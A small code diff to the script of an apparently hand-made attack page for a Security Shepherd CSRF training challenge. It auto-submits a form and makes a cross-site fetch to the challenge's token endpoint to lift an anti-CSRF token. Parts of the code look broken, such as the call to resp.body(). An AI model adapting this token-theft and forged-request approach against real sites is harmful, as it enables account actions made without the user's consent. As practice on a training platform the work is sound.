@@ -21,7 +21,7 @@
 
         <script>
             document.token.submit();
-            const content = await fetch(
+            const content = fetch(
                'https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengeseven/getToken',
                {
                    method: 'GET',
@@ -31,7 +31,7 @@
                        'Sec-Fetch-Site': 'cross-site'
                    }
                } 
-            )
+            ).then(resp=>resp.body());
             let iframe = document.getElementById("tokenTarget");
             console.log(iframe.contentDocument);
             console.log(iframe.contentWindow.location.href);
